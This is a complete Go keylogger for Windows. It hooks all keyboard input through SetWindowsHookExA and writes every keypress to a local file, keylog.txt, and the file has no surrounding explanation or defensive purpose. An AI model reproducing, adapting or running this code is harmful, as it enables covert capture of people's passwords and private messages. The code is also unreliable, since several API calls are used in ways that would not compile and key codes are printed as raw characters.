package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"
)

var (
	moduser32              = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookEx    = moduser32.NewProc("SetWindowsHookExA")
	procCallNextHookEx      = moduser32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = moduser32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = moduser32.NewProc("GetMessageA")
	procTranslateMessage    = moduser32.NewProc("TranslateMessage")
	procDispatchMessage     = moduser32.NewProc("DispatchMessageA")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
	HC_ACTION      = 0
)

type KBDLLHOOKSTRUCT struct {
	vkCode uint32
	scanCode uint32
	flags uint32
	time uint32
	dwExtraInfo uintptr
}

type HookProc func(int, uintptr, uintptr) uintptr

var logFile *os.File

func LowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == HC_ACTION {
		pKeyboard := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
			fmt.Fprintf(logFile, "%c", pKeyboard.vkCode)
			logFile.Sync()
		}
	}
	return procCallNextHookEx.Call(uintptr(unsafe.Pointer(hHook)), uintptr(nCode), wParam, lParam)
}

var hHook uintptr

func main() {
	var err error
	logFile, err = os.Create("keylog.txt")
	if err != nil {
		log.Fatalf("Unable to open log file: %v", err)
	}
	defer logFile.Close()

	hHook, _, _ = procSetWindowsHookEx.Call(
		uintptr(WH_KEYBOARD_LL),
		uintptr(unsafe.Pointer(syscall.NewCallback(LowLevelKeyboardProc))),
		uintptr(0),
		uintptr(0),
	)

	if hHook == 0 {
		log.Fatal("Unable to install hook")
	}
	defer procUnhookWindowsHookEx.Call(hHook)

	var msg syscall.MSG
	for procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), uintptr(0), uintptr(0), uintptr(0)) != 0 {
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}
